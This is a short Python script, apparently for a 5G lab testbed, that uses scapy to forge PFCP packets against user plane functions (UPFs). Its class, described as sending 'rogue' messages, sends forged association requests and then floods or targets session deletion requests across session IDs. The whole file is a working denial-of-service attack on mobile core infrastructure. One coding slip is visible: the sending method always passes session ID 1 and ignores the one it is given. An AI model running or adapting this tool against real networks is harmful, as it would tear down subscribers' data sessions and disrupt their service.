from scapy.all import sendp, send, sr1,srp1, sniff, Packet, hexdump, Ether, IP, ICMP, UDP 
from scapy.contrib.pfcp import *
import os
import time



class PFCP_sender:
    """
    A class that sends rogue PCFP messages to upfs.
    """
    def __init__(self, source_ip="10.0.14.14", destination_ips=["10.0.17.1"]):
        #print ("source ip", source_ip, "destination_ip", destination_ips)
        self.source_ip=source_ip
        self.seq=60
        if not type(destination_ips)== list:
            self.destination_ips=[destination_ips]
        else:
            self.destination_ips=destination_ips
    
    
    def gen_packet(self,t=54,destination_ip=None, seid=1):
        """
        54 deletion, 5 associate request, Heartbeat
        """
        if destination_ip==None:
            destination_ip=self.destination_ips[0]
        pkt=Ether(dst="00:00:00:00:00:00")/IP(src=self.source_ip, dst=destination_ip, ihl=5, flags="DF")/UDP(dport=8805, sport=8805)/PFCP(version=1, message_type=t,seid=seid, length=12 , seq=self.seq)
        self.seq+=1
        return pkt

    def send_packet(self, t, destination_ip, seid=1):
        """
        """
        p= self.gen_packet(t=t, destination_ip=destination_ip, seid=1)
        sendp(p, iface="lo")
        
    def associate_request(self, destination_ips=None):
        """
        In order to send requests we need to associate to the upfs first.
        """
        if destination_ips==None:
            destination_ips=self.destination_ips
        for ip in destination_ips:
                self.send_packet(t=5, destination_ip=ip) 
                print("Sending association request to UPF at: ", ip)
                
    def flood_session_delete_requests(self, seid_range=(0,10)):
        """
        Flood sesseion delete packets in a seid_range.
        """
       
        
        for seid in range(seid_range[0], seid_range[1]):
            if seid%4==0:
                self.associate_request()#associate to upf, we will not be bothering with hearbeats so we have to reassociate every couple requests
            for ip in self.destination_ips:
                self.send_packet(t=54, destination_ip=ip, seid=seid)
                print("Sending session delete request for SEID: ", seid, " To upf: ", ip)                
                
    def targeted_session_delete_request(self, seid=1, destination_ip=None):
        """
        Delete a specific session on a upf
        """
        if destination_ip==None:
            destination_ip=self.destination_ips[0]         
        self.associate_request(destination_ips=[destination_ip])
        self.send_packet(t=54, destination_ip=destination_ip, seid=seid )
        print("Sending session delete request for SEID: ", seid, " To upf: ", destination_ip) 



